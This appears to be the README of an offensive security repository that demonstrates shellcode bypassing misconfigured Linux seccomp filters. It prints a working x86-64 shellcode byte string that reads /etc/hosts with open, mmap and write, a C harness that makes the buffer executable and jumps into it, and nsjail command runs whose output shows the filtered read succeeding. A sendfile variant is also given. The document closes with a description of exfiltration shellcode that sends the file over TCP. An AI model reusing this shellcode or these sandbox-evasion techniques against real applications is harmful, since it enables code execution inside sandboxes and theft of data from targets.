# seccomp-bypass
seccomp is used by applications to restrict system calls it can make, thus sandboxing it. Its goal is to limit the application to only the facilities it needs to perform its job and nothing more.

The goal here is to bypass these seccomp restrictions when exploiting applications. You need shellcode that will carry out its purpose while still adhering to the application's seccomp filter. So if the filter specifies a denial of `read` and `write`, then valid shellcode may use any system call but those.

**Bypasses are possible not because seccomp is flawed, but because sometimes seccomp filters are inappropriately configured. Just like an exploit takes advantage of programming mistakes, these bypasses take advantage of configuration mistakes.**

# Premise
A typical exploit scenario is that you have a vulnerable application into which you can inject shell code. If it's sandboxed, you need to tailor the shellcode to include only the permitted system calls.

The code below is a generated application, contrived purely to run test shellcode from `src/`. The output is a test program that we run to confirm the shellcode's viability when injected into a foreign application.

&gt;: ./gen-shellcode.sh src/read-with-mmap.s
```c
#include <stdint.h>
#include <sys/mman.h>

char shellcode[] = "\x66\x41\xbb\x74\x73\x41\x53\x49\xbb\x2f\x65\x74\x63\x2f\x68"
                   "\x6f\x73\x41\x53\x48\x8d\x3c\x24\x48\x31\xf6\x04\x02\x0f\x05"
                   "\x48\x31\xff\x48\x31\xf6\x66\xbe\xff\xff\x48\x31\xd2\x80\xc2"
                   "\x01\x49\x89\xc0\x4d\x31\xc9\x4d\x31\xd2\x41\x80\xc2\x01\x48"
                   "\x31\xc0\xb0\x09\x0f\x05\x48\x31\xff\xfe\xc2\x48\x89\xc6\x48"
                   "\x31\xd2\x66\xba\xff\xff\x48\x31\xc0\xfe\xc0\x0f\x05\x48\x31"
                   "\xff\xb2\x03\x48\x31\xc0\xb0\x3c\x0f\x05";

int main(){
  mprotect((void *)((uint64_t)shellcode & ~4095), 4096, PROT_READ|PROT_EXEC);
  (*(void(*)()) shellcode)();
  return 0;
}
```
This program is a test harness for the shellcode that'll be injected into the vulnerable application. It's this shellcode that is intended to leverage only the system calls permitted by the vulnerable application's seccomp filter.

Compile it with: `$gcc -static read-with-mmap.c -o read-with-mmap`

# Examples
Below are examples of shellcodes that perform each section's goal within certain system call constraints. Each goal has one or more shellcodes using a combination of system call combinations to achieve it.

*To follow along, use [Google's nsjail](https://github.com/google/nsjail) to run programs with a specific seccomp policy.*

## Read a file from the filesystem
Each of these examples reads the file `/etc/hosts` from the target system using a variety of system calls.
### read-with-mmap.s
#### syscalls: `open`,`write`, `mmap`,`exit`
This example is based on shellcode from `src/read-with-mmap.s`. You can see the line `127.0.0.1	localhost` present in the output below, which is a sign the seccomp filter is bypassed successfully.

Try replacing the `read` in the DENY clause with `open`,`exit`,`write`, or `mmap`. Doing so should cause the command to fail because the shellcode in this example uses all four of those calls.

Generate the program:
```bash
>: f=`tempfile`; ./gen-shellcode.sh src/read-with-mmap.s > $f.c; gcc -static $f.c -o $f
```

Now run it with seccomp filters in place with `nsjail`:
```bash
>: ~/nsjail/nsjail -Mo --chroot / --seccomp_string 'POLICY a { DENY { read } } USE a DEFAULT ALLOW' -- $f
[2017-05-12T16:48:04-0700] Mode: STANDALONE_ONCE
...
[2017-05-12T16:48:04-0700] Executing '/tmp/fileVRncd7' for '[STANDALONE_MODE]'
127.0.0.1	localhost
```

Below shows a default DENY policy. You'll need to allow a few more system calls to use it in this example. This is a wider set of calls than what is required of an application in the wild, which does "start > set seccomp filter > fork", because in this example case we have to interact with the OS to set up the process space first (doing an `execve` and not just a `fork`.

```bash
>: ~/nsjail/nsjail -Mo --chroot / --seccomp_string 'POLICY a { ALLOW { open, write, mmap, execve, newuname, brk, arch_prctl, readlink, access, mprotect, exit } } USE a DEFAULT DENY' -- $f
```

### read-with-sendfile.s
#### syscalls: `open`, `sendfile`,`exit`
This example is based on shellcode from `src/read-with-sendfile.s`. We can get away with reading a file with just these two system calls, explicitly denying the typical `read` and `mmap` calls.

Blacklist policy (default allow):
```bash
>: f=`tempfile`; ./gen-shellcode.sh src/read-with-sendfile.s > $f.c; gcc -static $f.c -o $f
>: ~/nsjail/nsjail -Mo --chroot / --seccomp_string 'POLICY a { DENY { read,write,mmap } } USE a DEFAULT ALLOW' -- $f
[2017-05-15T16:03:04-0700] Mode: STANDALONE_ONCE
...
[2017-05-15T16:03:04-0700] Executing '/tmp/fileCNqBB4' for '[STANDALONE_MODE]'
127.0.0.1	localhost
```

Whitelist policy (default deny):
```bash
>: ~/nsjail/nsjail -Mo --chroot / --seccomp_string 'POLICY a { ALLOW { open, sendfile64, execve, newuname, brk, arch_prctl, readlink, access, mprotect, exit } } USE a DEFAULT DENY' -- $f
```

## Remotely read a file from the filesystem
Each of these examples exfiltrates the file `/etc/hosts` from the target system using a variety of system calls.

### exfil-with-sendfile.s
#### syscalls: `open`, `sendfile`, `socket`, `connect`,`exit`
This example is based on shellcode from `src/exfil-with-sendfile.s`. This will read `/etc/hosts` on the target and dump it to 127.0.0.1 TCP/8000. This currently only supports ipv4.
